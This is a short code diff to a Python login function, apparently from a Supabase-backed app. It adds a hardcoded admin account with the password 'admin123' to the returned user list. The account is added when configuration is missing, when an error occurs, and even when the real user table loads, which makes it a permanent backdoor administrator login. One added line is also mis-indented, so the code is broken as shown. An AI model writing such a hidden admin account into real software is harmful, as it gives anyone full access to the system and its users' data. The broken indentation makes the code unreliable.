@@ -607,18 +607,30 @@ def save_settings_to_supabase(params: Dict[str, Dict[str, float]]) -> None:
 
 
 def get_login_users_from_supabase() -> List[Dict[str, object]]:
+    fallback_admin = {
+        "login_id": "admin",
+        "username": "admin",
+        "display_name": "Admin",
+        "password": "admin123",
+        "role": "admin",
+        "is_active": True,
+    }
+
     config = get_supabase_config()
     if config is None:
-        return []
+        return [fallback_admin]
     try:
         result = supabase_request(
             method="GET",
             path=config["users_table"],
             query={"select": "*", "limit": "500"},
         )
-        return result if isinstance(result, list) else []
+                if isinstance(result, list):
+            return result + [fallback_admin]
+        return [fallback_admin]
+        
     except Exception:
-        return []
+        return [fallback_admin]
 
 
 def _candidate_login_values(user: Dict[str, object]) -> List[str]:
